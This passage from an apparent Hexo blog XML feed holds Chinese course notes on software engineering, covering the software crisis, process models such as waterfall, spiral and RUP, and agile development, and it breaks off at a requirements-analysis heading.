;显式给出存放段地址的寄存器</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240115220506695.png" alt="image-20240115220506695" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 课内 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课内 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程</title>
      <link href="/2024/01/10/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
      <url>/2024/01/10/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="软件的本质"><a href="#软件的本质" class="headerlink" title="软件的本质"></a>软件的本质</h1><h2 id="软件的本质-1"><a href="#软件的本质-1" class="headerlink" title="软件的本质"></a>软件的本质</h2><p>现在的软件具有<strong>产品</strong>和<strong>产品交付载体</strong>的双重作用。</p><ul><li>作为产品，软件显示了由计算机硬件体现的计算能力，或者说显示的是由一个可被本地硬件设备访问的计算机网络体现的计算潜力。软件扮演着信息转换的角色；产生、管理、获取、修改、显示或者传输各种不同的信息</li><li>作为产品生产的载体，软件提供了计算机控制(操作系统)、信息通信(网络)、以及应用程序开发和控制(软件工作和环境)的基础平台</li></ul><p>软件提供了我们这个时代最重要的产品——信息。</p><h3 id="软件的定义"><a href="#软件的定义" class="headerlink" title="软件的定义"></a>软件的定义</h3><p>来自教科书的关于软件的定义也许是：</p><p>软件是</p><ul><li><strong>指令的集合</strong>(计算机程序)，通过执行这些指令可以满足预期的特性、功能和性能需求</li><li><strong>数据结构</strong>，使得程序可以合理利用信息</li><li><strong>软件描述信息</strong>，它以硬拷贝和虚拟形式存在，用来描述程序的操作和使用</li></ul><blockquote><p>&#x3D;&#x3D;软件&#x3D;程序+数据+文档&#x3D;&#x3D;</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103164602925.png" alt="image-20240103164602925" style="zoom:33%;" /><blockquote><p>软件不会磨损，但是软件退化的确存在。</p></blockquote><p>在完整生命周期里，软件将会面临变更，每次变更都可能引入新的错误。可以说，<strong>不断的变更是软件退化的根本原因。</strong></p><h3 id="软件应用领域"><a href="#软件应用领域" class="headerlink" title="软件应用领域"></a>软件应用领域</h3><p>今天，计算机软件可分为七大类</p><ul><li><strong>系统软件</strong>——整套服务于其他程序的程序</li><li><strong>应用软件</strong>——解决特定非业务需要的独立应用程序</li><li><strong>工程&#x2F;科学软件</strong>——“数值计算”类程序涵盖了广泛的应用领域</li><li><strong>嵌入式软件</strong>——存在于某个产品或者系统中，可实现和控制面向最终用户和系统本身的特性和功能</li><li><strong>产品线软件</strong>——为多个不同用户的使用提供特定功能</li><li><strong>Web&#x2F;移动APP</strong>——以网络为中心，其概念涵盖了宽泛的应用软件产品</li><li><strong>人工智能软件</strong>——利用非数值计算算法解决计算和直接分析无法解决的复杂问题</li></ul><p>现在人们认为：在信息产业中，<strong>微电子是基础，计算机和网络是载体，软件是核心</strong>。</p><h2 id="软件的变更本质"><a href="#软件的变更本质" class="headerlink" title="软件的变更本质"></a>软件的变更本质</h2><p>四大类软件不断演化，在行业中占有主导地位。这四类软件在十几年前还处于初级阶段</p><ul><li><strong>WebApp</strong>——基于Web的系统和应用软件</li><li><strong>移动App</strong>——通常包括用户接口、用户接口利用移动平台所提供的独特交互机制，基于Web资源的互操作性提供方与App相关的大量信息的访问，并具有本地处理能力，以最适合移动平台的方式收集、分析和格式化信息</li><li><strong>云计算</strong>——包括基础设施或”生态系统”，能使得任何用户在任何地点都可以使用计算设备来共享广泛的计算资源。</li><li><strong>产品线软件</strong>——一系列软件密集型系统可以，可以共享一组公共的可管理的特性，这些特性可以满足特定市场或任务的特定需求，并以预定的方法从一组公共的核心资源开发出来。</li></ul><h1 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h1><h2 id="软件危机"><a href="#软件危机" class="headerlink" title="软件危机"></a>软件危机</h2><p>软件危机是：在计算机软件的<strong>开发和维护</strong>过程中所遇到的一系列严重问题(效率和质量下降)。</p><ul><li>项目超出预算</li><li>项目超过计划完成时间</li><li>软件运行效率很低</li><li>软件质量差</li><li>软件通常不符合要求</li><li>项目难以管理并且代码难以维护</li><li>软件不能交付</li></ul><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul><li>客观：软件本身特点<ul><li>逻辑部件规模庞大</li></ul></li><li>主观：不正确的开发方式<ul><li>忽略需求分析</li><li>错误认为：软件开发&#x3D;程序编写</li><li>轻视软件维护</li></ul></li></ul><p>消除软件危机的途径：<strong>软件工程</strong>！</p><h2 id="软件工程-1"><a href="#软件工程-1" class="headerlink" title="软件工程"></a>软件工程</h2><h3 id="软件工程定义"><a href="#软件工程定义" class="headerlink" title="软件工程定义"></a>软件工程定义</h3><blockquote><p>软件工程概念的提出：目的是倡导以工程的原理、原则和方法进行软件开发，以解决软件危机。</p></blockquote><ul><li><p>计算机百科全书上的软件工程定义：</p><p>应用计算机科学、数学及管理科学等原理，以工程化方法制作软件的工程。它借鉴传统工程的原则、方法，创建软件以达到提高质量，降低成本的目的。</p><p>其中，计算机科学、数学用于构建模型与算法，工程科学用于指定规范、设计范型、评估成本及确定权衡，管理科学用于计划、资源质量、成本等管理。</p><p>软件工程是一门指导计算机软件开发和维护的工程学科。软件工程是一门交叉性学科。</p></li><li><p>首次NATO会议上的软件工程定义：</p><p>软件工程是用来建立和使用合理的工程原则，以经济地获取可靠的、且在真实机器上可高效工作的软件。</p></li><li><p>IEEE[IEE93]中的软件工程定义：</p><p>(1) 将系统化的、规范的、可量化的方法应用于软件的开发、运行和维护，即 将工程化方法应用于软件；</p><p>(2) 对 (1) 中所述方法的研究。</p><p>目标是在给定的预算内，按照用户的需求，开发易修改、高效、可靠、可维护、适应力强、可移动、可重用的软件。</p></li></ul><h3 id="软件工程框架"><a href="#软件工程框架" class="headerlink" title="软件工程框架"></a>软件工程框架</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103193713871.png" alt="image-20240103193713871" style="zoom:50%;" /><p>软件工程可定义为三元组：&lt;目标，原则，活动&gt;</p><ul><li>给出了软件所涉及软件工程的工程要素</li><li>给出了各要素之间的关系</li><li>给出了软件工程学科所研究的主要内容</li></ul><h3 id="软件工程目标"><a href="#软件工程目标" class="headerlink" title="软件工程目标"></a>软件工程目标</h3><p>目标：生产具有正确性、可用性以及开销合益的产品。</p><ul><li>正确性：意指软件产品达到预期功能的程度</li><li>可用性：意指软件基本结构、实现及文档为用户可用的程度</li><li>开销合益：指软件开发、运行的整个开销满足用户要求的程度</li></ul><h3 id="软件工程的活动"><a href="#软件工程的活动" class="headerlink" title="软件工程的活动"></a>软件工程的活动</h3><p>活动：生产一个最终满足要求且达到工程目标的软件产品所需要的步骤</p><ul><li>主要包括：&#x3D;&#x3D;需求、设计、实现、确认和支持&#x3D;&#x3D;等活动。</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103200135300.png" alt="image-20240103200135300" style="zoom:33%;" /><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>定义问题：即建立系统模型</p><p>主要任务包括：</p><ul><li><p>需求获取</p></li><li><p>需求定义(即定义问题)系统功能的一个正确的陈述</p></li><li><p>需求规约：系统需求规格说明    》主要成分：系统模型系统功能的一个精确、系统的描述。</p></li><li><p>需求验证:验证需求陈述和需求规约之间的一致性、完整性和可跟踪性。</p></li></ul><h4 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h4><p>在需求分析的基础上，给出系统的软件设计方案。</p><p>设计包括：总体设计(也称为概要设计)和详细设计</p><ul><li>总体设计：建立整个软件体系结构<ul><li>包括子系统、模块(或构件)以及相关层次的说明、每一模块(或构件)的接口定义。</li><li>体系结构类型可分为：层次模块体系结构、C&#x2F;S体系结构、以数据库为中心的体系结构、管道结构和面向对象的结构等</li></ul></li><li>详细设计：针对总体设计的结果，给出体系结构中每一模块或构件的详细描述<ul><li>即给出它们的数据结构说明和实现算法</li></ul></li></ul><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>把设计结果转换为可执行的程序代码</p><p>具体做法分为两种：</p><ul><li>选择可用的模块或构件或以一种选定的语言，对每一模块或构件进行编码</li></ul><h4 id="确认"><a href="#确认" class="headerlink" title="确认"></a>确认</h4><p>确认活动贯穿于整个开发过程</p><p>实现完成后的确认，确保最终产品满足用户的需求。</p><p>确认活动主要包含：需求复审、设计复审以及程序测试。主要任务是：软件测试。</p><h4 id="支持"><a href="#支持" class="headerlink" title="支持"></a>支持</h4><p>支持活动包括修改和完善</p><p>它为系统的运行提供完善性维护、纠错性维护和适应性维护。</p><h1 id="软件过程"><a href="#软件过程" class="headerlink" title="软件过程"></a>软件过程</h1><h3 id="软件生命周期"><a href="#软件生命周期" class="headerlink" title="软件生命周期"></a>软件生命周期</h3><p>定义：软件产品或软件系统从设计、投入使用到被淘汰的全过程。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103202123887.png" alt="image-20240103202123887" style="zoom: 33%;" /><h3 id="软件过程-1"><a href="#软件过程-1" class="headerlink" title="软件过程"></a>软件过程</h3><p>软件过程是在工作产品构建过程中，为创建高质量软件所需完成的工作<strong>活动、动作和任务</strong>的集合(框架)。</p><p>&#x3D;&#x3D;活动&#x3D;&#x3D;主要实现宽泛的目标，与应用领域、项目大小、结果复杂性或者实施软件工程的重要程度没有直接关系</p><p>&#x3D;&#x3D;动作&#x3D;&#x3D;包含了主要工作产品生产过程中的一系列任务</p><p>&#x3D;&#x3D;任务&#x3D;&#x3D;关注小而明确的目标，能够产生实际产品。</p><h3 id="软件过程模型"><a href="#软件过程模型" class="headerlink" title="软件过程模型"></a>软件过程模型</h3><p>最早提出过程模型是为了改变软件开发的混乱状态，使软件开发更加有序。历史证明，这些模型为软件过程提出了大量有用的结构，并为软件团队提供了有效的路线图。</p><p>在一篇探讨<strong>软件世界中有序和混乱之间奇怪关系</strong>的论文中指出：</p><blockquote><p>混乱的边缘可定义为”有序和混乱之间的一种自然状态，结构化和反常之间的重大妥协。“混乱的边缘可以被视为一种不稳定和部分结构化的状态······它的不稳定是因为它不停的受到混乱或者完全有序的影响</p><p>我们通常认为有序是自然的完美状态。这可能是个误区······研究证实，打破平衡的活动会产生创造力、自我组织的过程和更高的回报。完全的有序意味着缺乏可变性而可变性在某些不可预测的环境下往往是一种优势。变更通常发生在某些结构中，这些结构使得变更可以被有效组织，但还不是死板得使得变更无法发生。另一方面，太多的混乱会使协调和一致成为不可能。缺少结构并不意味着无序。</p></blockquote><p>本章所描述的每一个过程模型都**&#x3D;&#x3D;试图在找出混乱世界中的秩序和适应不断发生的变化这两种要求之间寻求平衡。&#x3D;&#x3D;**</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>是软件开发全部过程、活动和任务的结构框架。它能直观表达软件开发全过程，明确规定要完成的主要活动、任务和开发策略。</p><p>也被称为:</p><ul><li>软件开发模型</li><li>软件生存周期模型</li><li>软件工程范型</li></ul><h3 id="能力成熟度模型-CMM"><a href="#能力成熟度模型-CMM" class="headerlink" title="能力成熟度模型 CMM"></a>能力成熟度模型 CMM</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103202847791.png" alt="image-20240103202847791" style="zoom: 33%;" /><h2 id="惯用过程模型"><a href="#惯用过程模型" class="headerlink" title="惯用过程模型"></a>惯用过程模型</h2><p>惯用过程模型力求达到软件开发的结构和秩序，其活动和任务都是按照过程的特定指引顺序进行的。</p><p>接下来讨论的软件过程模型支持之前提到的软件过程通用框架活动，但是每一个模型都对框架活动有所侧重，并且定义了不同的过程流以不同的方式执行每一个框架活动(以及软件工程动作和任务)</p><h3 id="瀑布模型-Waterfall-model"><a href="#瀑布模型-Waterfall-model" class="headerlink" title="瀑布模型(Waterfall model)"></a>瀑布模型(Waterfall model)</h3><ul><li>可行性研究<ul><li>需求分析<ul><li>总体设计<ul><li>详细设计<ul><li>编码<ul><li>单元测试<ul><li>系统测试<ul><li>验收测试<ul><li>运行与维护</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>第一个软件过程模型。是一种使用广泛，以文档为驱动的模型</li><li>软件开发过程与软件生命周期一致：也称为<strong>经典生命周期模型</strong></li><li>规定了各项软件工程活动，以及它们自上而下，相互衔接的固定次序，如同瀑布流水，逐级下落</li><li>线性模型：阶段具有顺序性和依赖性。推迟实现的观点</li><li>每个阶段都有与其相关联的里程碑和可交付产品</li><li>每个阶段结束前完成文档审查，及早改正错误</li></ul><h4 id="待反馈的瀑布模型"><a href="#待反馈的瀑布模型" class="headerlink" title="待反馈的瀑布模型"></a>待反馈的瀑布模型</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103205113008.png" alt="image-20240103205113008" style="zoom:50%;" /><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>&#x3D;&#x3D;增加工作量&#x3D;&#x3D;</p><p>各个阶段的划分完全固定，阶段之间产生大量的文档，极大增加了工作量</p><p>&#x3D;&#x3D;开发风险大&#x3D;&#x3D;</p><p>由于开发模型是线性的，用户只有等到整个过程的末期才能见到开发成果，从而增加了开发的风险</p><p>&#x3D;&#x3D;早期错误发现晚&#x3D;&#x3D;</p><p>早期的错误可能要等到开发后期的测试阶段才能发现，进而带来严重的后果</p><p>&#x3D;&#x3D;不适应需求变化&#x3D;&#x3D;</p><p>不能反应实际的开发方式，软件开发需要迭代；无法适应需求不明确的需求的变化</p><h4 id="使用场合"><a href="#使用场合" class="headerlink" title="使用场合"></a>使用场合</h4><ul><li>系统<strong>需求明确且稳定</strong></li><li>技术成熟</li><li>工程管理较严格的场合如<strong>军工、航天、医疗</strong></li></ul><h3 id="V-模型-V-model"><a href="#V-模型-V-model" class="headerlink" title="V-模型(V-model)"></a>V-模型(V-model)</h3><p>瀑布模型的变种：描述了质量保证动作同沟通。建模相关动作以及早期构建相关的动作之间的关系。提供了一种将验证和确认动作应用于早期软件工程工作中的直观方法。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103210255909.png" alt="image-20240103210255909" style="zoom: 33%;" /><h3 id="原型模型"><a href="#原型模型" class="headerlink" title="原型模型"></a>原型模型</h3><p>也称为：原型化模型、快速原型模型</p><p>&#x3D;&#x3D;原型(prototype)&#x3D;&#x3D;</p><ul><li>一个部分开发的产品，使客户和开发人员能够对计划开发的系统的相关方面进行检查。</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103212336863.png" alt="image-20240103212336863" style="zoom: 33%;" /><p>&#x3D;&#x3D;原型化目的&#x3D;&#x3D;</p><ul><li>明确并完善需求，如演示原型</li><li>研究技术选择方案，如技术验收原型</li></ul><p>&#x3D;&#x3D;原型结果&#x3D;&#x3D;</p><ul><li>抛弃原型</li><li>把原型发展成最终产品</li></ul><p>&#x3D;&#x3D;举例&#x3D;&#x3D;</p><ul><li>图书借阅系统：主要界面</li><li>智能家居系统：少量的室内信息监视和电器控制</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103212541026.png" alt="image-20240103212541026" style="zoom: 50%;" /><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>减少需求不明确带来的风险</p><h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ul><li>构造原型采用的技术和工具不一定主流</li><li>快速建立起来的系统加上连续的修改可能导致原型质量低下</li><li>设计者在质量和原型中进行折中</li><li>客户意识不到一些质量问题</li></ul><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><ul><li>客户定义一个总体目标集，但是它们<strong>并不清楚系统的具体输入输出；或开发者不确定算法的效率、软件与操作系统是否兼容以及客户与计算机交互的方式</strong></li><li>此时，原型模型是很好的选择</li></ul><h3 id="增量模型"><a href="#增量模型" class="headerlink" title="增量模型"></a>增量模型</h3><p>增量：满足用户需求的一个子集，能够完成一定功能、小而可用的软件</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><ul><li><p>文字处理软件：创建文本、组织文本、格式化文本</p><p>第一个增量，创建文本-&gt;第一个发布：创建文本；-&gt;第二个增量，组织文本-&gt;第二个发布：创建文本、组织文本。-&gt;第三个增量······</p></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103213125109.png" alt="image-20240103213125109" style="zoom:50%;" /><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul><li>增量模型是一种<strong>非整体开发</strong>的模型，是一种<strong>进化式</strong>的开发过程</li><li>增量模型从部分需求触发，先建立一个不完整的系统，通过测试运行这个系统取得经验和反馈，进一步使系统扩充和完善</li><li>如此反复，直到软件人员和用户对软件系统满意</li><li>增量模型结合了<strong>原型模型的基本要素和迭代的特征</strong>，采用了基于时间的线性序列，每个线性序列都会输出该软件的一个”增量”</li><li>每个增量的开发可用瀑布或快速原型模型</li></ul><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ul><li>增量概念的引入，不需要提供完整的需求，只要有一个增量出现，开发就可以进行</li><li>软件能更早投入市场</li><li>开放式体系结构，便于维护</li><li>在项目的初始阶段不需要投入太多的人力资源</li><li>产品逐步交付，软件开发能够较好地适应需求的变化</li><li>能都看到软件中间产品，提出改进意见，减少返工，降低开发风险</li></ul><h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><ul><li>每个增量必须提供一些系统功能，这是的开发者很难根据客户需求给出大小合适的增量</li><li>软件必须具备开放式体系结构(困难)</li><li>易退化成边做边改的方式，使软件过程控制<strong>失去整体性</strong></li></ul><h4 id="使用场合-1"><a href="#使用场合-1" class="headerlink" title="使用场合"></a>使用场合</h4><p>适用于软件开发中<strong>需求可能发生变化、具有较大风险</strong>、或者<strong>希望尽早进入市场</strong>的项目</p><h3 id="螺旋模型"><a href="#螺旋模型" class="headerlink" title="螺旋模型"></a>螺旋模型</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul><li>软件开发普遍存在风险<ul><li>交付的产品用户不满意</li><li>产品不能按时交付</li><li>开发成本超过预算</li><li>产品开发期间关键开发人员离职</li><li>产品投入市场前竞争对手发布功能相近价格更低产品</li><li>···</li></ul></li></ul><p>把<strong>开发活动</strong>和<strong>风险管理</strong>结合起来控制风险</p><h4 id="螺旋模型-1"><a href="#螺旋模型-1" class="headerlink" title="螺旋模型"></a>螺旋模型</h4><ul><li><p>开发过程分为若干次迭代，每次迭代代表开发的一个阶段，对应模型中一条环线</p></li><li><p>每次迭代分成四个方面的活动，对应四个象限</p><ul><li>确定本阶段目标，选定实施方案，弄清项目开发的限制条件</li><li>评估所选方案，通过构造原型和风险分析识别和消除风险</li><li>实施软件开发和验证</li><li>评价本阶段的工作成果，提出修正建议，并计划下一阶段工作。</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103214420796.png" alt="image-20240103214420796" style="zoom:50%;" /></li></ul><p>模型结合了瀑布模型和原型模型的特点</p><h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ul><li>强调原型的可扩充性和可修改性，原型的进化贯穿整个软件生命周期，这将有助于目标软件的适应能力，支持用户需求的动态变化</li><li>原型可看做可执行的需求规格说明，易于为用户和开发人员共同理解，还可以作为继续开发的基础，并为用户参与所有关键决策提供了方便</li><li>螺旋模型为项目管理人员及时调整管理决策提供了方便，进而可降低开发风险</li></ul><h4 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h4><ul><li>如果每次迭代的效率不高，将导致迭代次数过多，将会增加成本并推迟交付时间</li><li>需要有相当丰富的风险评估经验和专门知识，要求开发队伍水平较高，否则会到来更大风险。</li></ul><h4 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h4><p>需求不明确<strong>可能发生变</strong>化的<strong>大型复杂</strong>的软件系统</p><p>支持面向过程、面向对象等多种软件开发方法，是一种具有广阔前景的模型</p><h3 id="喷泉模型"><a href="#喷泉模型" class="headerlink" title="喷泉模型"></a>喷泉模型</h3><p>是一种以用户需求为动力，以对象为驱动的模型，主要用于描述面向对象的软件开发过程</p><p>软件开发早期定义对象，整个开发过程充实和扩充对象</p><p>各个阶段使用统一的概念和表示方法，生命周期各阶段无缝连接</p><p>各个开发步骤多次反复迭代</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103215212626.png" alt="image-20240103215212626" style="zoom: 50%;" /><h4 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h4><p>各个阶段有明显的界限，开发人员可以同步进行开发，可以提高软件项目开发效率，节省开发时间，适用于面向对象的软件开发过程</p><h4 id="缺点-4"><a href="#缺点-4" class="headerlink" title="缺点"></a>缺点</h4><p>喷泉模型在各个开发阶段是重叠的，在开发过程总需要大量的开发人员，因此不利于项目的管理</p><p>喷泉模型要求严格管理文档，使得审核的难度加大，尤其死面对可能随时加入的各种信息、需求与资料的情况</p><h4 id="适用场合-1"><a href="#适用场合-1" class="headerlink" title="适用场合"></a>适用场合</h4><p><strong>面向对象开发</strong></p><h2 id="软件过程模型的选择"><a href="#软件过程模型的选择" class="headerlink" title="软件过程模型的选择"></a>软件过程模型的选择</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104014606511.png" alt="image-20240104014606511"></p><h2 id="专用过程模型"><a href="#专用过程模型" class="headerlink" title="专用过程模型"></a>专用过程模型</h2><p>专用过程模型具有前面提到的传统过程模型的一些特点，但是，专用过程模型往往应用较窄且专一，只适用于某些特定的软件工程方法</p><h3 id="基于构件的开发模型"><a href="#基于构件的开发模型" class="headerlink" title="基于构件的开发模型"></a>基于构件的开发模型</h3><p>Component-bases development model，近年来得到广泛关注，改变大型软件开发方式。</p><p>考虑的焦点是集成，而非实现</p><ul><li>构件&#x2F;组件(Component)<ul><li>系统中模块化的、可更换的部分</li><li>实现特定的功能</li><li>对实现进行封装，暴露一组接口</li><li>例如：动态链接库(.dll)，浏览器插件</li></ul></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104004905174.png" alt="image-20240104004905174" style="zoom:50%;" /><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>&#x3D;&#x3D;需求分析&#x3D;&#x3D;</p><p>与其他过程模型相同</p><p>&#x3D;&#x3D;构件分析&#x3D;&#x3D;</p><p>根据需求搜索构件，如果没有完全匹配的构件，则需要修改构件或者修改需求</p><p>&#x3D;&#x3D;系统设计&#x3D;&#x3D;</p><p>与其他过程模型不同，考虑重用和集成，如果没有可重用的构件，则设计新软件</p><p>&#x3D;&#x3D;开发集成&#x3D;&#x3D;</p><ul><li><p>将构件集成到系统中</p></li><li><p>开发新软件</p></li></ul><h4 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h4><ul><li>软件<strong>复用</strong>思想</li><li>降低开发成本和风险，加快开发速度，提高软件质量</li></ul><h4 id="缺点-5"><a href="#缺点-5" class="headerlink" title="缺点"></a>缺点</h4><ul><li>模型复杂</li><li>商业构件不能修改，会导致修改需求，进而导致系统不能完全符合客户需求</li><li>无法完全控制所开发系统的演化</li><li>项目划分的好坏直接影响项目结果的好坏</li></ul><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>适用于<strong>系统之间有共性</strong>的情况</p><h2 id="统一过程"><a href="#统一过程" class="headerlink" title="统一过程"></a>统一过程</h2><p>某种程度上，统一过程尝试着从传统的软件过程中挖掘最好的特征和性质，但是以敏捷软件开发中许多最好的原则来实现。</p><p>统一过程认识到与客户沟通以及从用户的角度描述系统(即用例)并保持该描述的一致性的重要性。它强调软件体系结构的重要作用，并“帮助架构师专注于正确的目标，例如可理解性、对未来变更的可适应性以及复用”。</p><h3 id="Rational-统一过程模型"><a href="#Rational-统一过程模型" class="headerlink" title="Rational 统一过程模型"></a>Rational 统一过程模型</h3><p>Rational Unified Process -RUP</p><p>由Rational公司(现已被IBM收购)退出的完整且完美的软件工程方法，获得广泛使用</p><ul><li>基于面向对象方法学</li><li>使用统一建模语言UML(Unified Modeling Language)</li></ul><h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><p>从三个视角描述软件开发过程</p><ul><li>动态视角：随时间变化的各个阶段</li><li>静态视角：所进行的活动</li><li>实践视角：可采用的良好实践建议</li></ul><blockquote><p>适合大团队，大项目</p></blockquote><h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><p>&#x3D;&#x3D;1.迭代式开发&#x3D;&#x3D;</p><ul><li>需求变更不可避免</li><li>每次迭代产生一个可交付版本，用户反馈，减少风险</li><li>根据客户的轻重缓急来规划增量，先开发和交付优先级最高的增量</li></ul><p>&#x3D;&#x3D;2.管理需求&#x3D;&#x3D;</p><ul><li>采用用例分析来不会需求，由用例驱动设计和实现</li><li>对需求及变更进行管理</li></ul><p>&#x3D;&#x3D;3.基于构件体系结构&#x3D;&#x3D;</p><ul><li>采用基于构件的体系结构</li><li>提高软件复用率</li></ul><p>&#x3D;&#x3D;4.可视化建模&#x3D;&#x3D;</p><ul><li>使用统一建模语言(UML)对系统进行可视化建模</li></ul><p>&#x3D;&#x3D;5.验证软件质量&#x3D;&#x3D;</p><ul><li>软件质量评估贯穿整个开发过程的所有活动</li><li>全体成员参与</li></ul><p>&#x3D;&#x3D;6.控制软件变更&#x3D;&#x3D;</p><ul><li>描述如何控制和跟踪软件的变更</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104151656086.png" alt="image-20240104151656086" style="zoom:50%;" /><h1 id="敏捷开发"><a href="#敏捷开发" class="headerlink" title="敏捷开发"></a>敏捷开发</h1><p>敏捷软件工程师哲学理念和一系列开发指南的综合。这种哲学理念推崇：让客户满意且尽早的增量发布；小而高度自主的项目团队；非正式的方法；最小化软件工程工作产品以及整体精简开发。</p><p>开发的指导方针强调超越分析和设计(尽管并不排斥这类活动)的发布，以及开发人员和客户之间主动和持续的沟通。</p><h3 id="敏捷软件开发宣言"><a href="#敏捷软件开发宣言" class="headerlink" title="敏捷软件开发宣言"></a>敏捷软件开发宣言</h3><p>&#x3D;&#x3D;个体交互&#x3D;&#x3D;</p><p>个体和交互胜过过程和工具</p><p>&#x3D;&#x3D;可工作软件&#x3D;&#x3D;</p><p>可以工作的软件胜过面面俱到的文档</p><p>&#x3D;&#x3D;客户合作&#x3D;&#x3D;</p><p>客户合作胜过合同谈判</p><p>&#x3D;&#x3D;响应变化&#x3D;&#x3D;</p><p>响应变化胜过遵循计划(对变更的良好响应胜过了按部就班地遵循计划)</p><h3 id="什么是敏捷"><a href="#什么是敏捷" class="headerlink" title="什么是敏捷"></a>什么是敏捷</h3><p>敏捷已经成为当今描述现代软件过程的时髦用词。每个人都是敏捷的。敏捷团队是能够适当响应变更的灵活团队。变更就是软件开发本身，软件构建有变更、团队成员有变更，各种变更会对项目造成影响。我们必须接收”支持变更”的思想。</p><p>敏捷团队意识到软件是团队中所有人共同开发完成的，这些人的个人技能和合作能力是项目成功的关键所在。</p><p>敏捷不仅仅是&#x3D;&#x3D;有效地响应变更&#x3D;&#x3D;，它还包含开头的宣言中提及的哲学观念的信奉。鼓励能够使沟通更便利的团队结构和协作态度。强调可运行软件的快速交付而不那么看中中间产品。</p><h3 id="敏捷软件过程"><a href="#敏捷软件过程" class="headerlink" title="敏捷软件过程"></a>敏捷软件过程</h3><p>敏捷软件过程是&#x3D;&#x3D;基本原理&#x3D;&#x3D;和&#x3D;&#x3D;开发准则&#x3D;&#x3D;的结合</p><p>&#x3D;&#x3D;基本原理强调&#x3D;&#x3D;</p><ul><li>客户满意度和较早的软件增量交付</li><li>小但又激情的团队</li><li>非正式的方法</li><li>最小的软件工程产品</li><li>简化整体开发</li></ul><p>&#x3D;&#x3D;开发准则强调&#x3D;&#x3D;</p><ul><li>分析和设计的交付</li><li>开发者和客户之间积极持续的交流</li></ul><h3 id="极限编程"><a href="#极限编程" class="headerlink" title="极限编程"></a>极限编程</h3><p>extreme programming - Xp</p><p>它是敏捷软件开发中使用最广泛的一种方法，目标是在大型组织内部使用敏捷过程。</p><blockquote><p> 把好的开发实践运用到极致</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104014149675.png" alt="image-20240104014149675" style="zoom:50%;" /><h3 id="敏捷开发优点"><a href="#敏捷开发优点" class="headerlink" title="敏捷开发优点"></a>敏捷开发优点</h3><ul><li>快速响应变化和不确定性</li><li>可持续开发速度</li><li>适应商业竞争环境下的有限资源和有限时间</li></ul><h3 id="敏捷开发缺点"><a href="#敏捷开发缺点" class="headerlink" title="敏捷开发缺点"></a>敏捷开发缺点</h3><ul><li>测试驱动开发可能导致通过测试但非用户期望</li><li>重构而不降低质量困难</li></ul><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><h3 id="定义-1"><a href="#定义-1" class="headerlink" 